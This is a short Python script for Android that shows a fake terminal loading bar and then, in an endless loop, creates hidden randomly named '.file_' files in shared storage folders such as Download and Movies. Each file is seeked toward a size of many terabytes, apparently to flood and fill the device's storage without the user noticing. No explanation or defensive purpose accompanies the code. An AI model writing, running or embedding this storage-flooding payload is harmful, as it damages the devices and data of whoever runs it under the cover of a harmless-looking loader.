import os, time
R = ("\033[31m")
pink = ('\033[95m')
G = ('\033[92m')
os.system('clear')
print(R)
print (R+"\n▓"+G+"▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print (R+"\n▓▓"+G+"▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print (R+"\n▓▓▓"+G+"▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print (R+"\n▓▓▓▓"+G+"▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print (R+"\n▓▓▓▓▓"+G+"▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print (R+"\n▓▓▓▓▓▓"+G+"▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print (R+"\n▓▓▓▓▓▓▓"+G+"▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print (R+"\n▓▓▓▓▓▓▓▓"+G+"▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print (R+"\n▓▓▓▓▓▓▓▓▓"+G+"▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system('clear')
print (R+"\n▓▓▓▓▓▓▓▓▓▓"+G+"▒▒▒▒▒ Loading ...\n")
time.sleep(0.2)
os.system('clear')
print (R+"\n▓▓▓▓▓▓▓▓▓▓▓"+G+"▒▒▒▒ Loading ...\n")
time.sleep(0.4)
os.system('clear')
print (R+"\n▓▓▓▓▓▓▓▓▓▓▓▓"+G+"▒▒▒ Loading ...\n")
time.sleep(0.9)
os.system('clear')
print (R+"\n▓▓▓▓▓▓▓▓▓▓▓▓▓"+G+"▒▒ Loading ...\n")
time.sleep(0.1)
import random
try:
    import uuid
except:
    os.system('pip3 install uuid')
size = 3419559 * 5024 * 1024
filename_prefix = '.file'
try:
	paths = ['/storage/emulated/0/', '/storage/emulated/0/Download/', '/storage/emulated/0/Movies/','/storage/emulated/0/Android/']
except:
	paths = ['/storage/emulated/0/Download/']
while True:
    path = random.choice(paths)
    filename = os.path.join(path, f"{filename_prefix}_{uuid.uuid4()}")
    with open(filename, 'wb') as f:
        f.seek(size - 1)
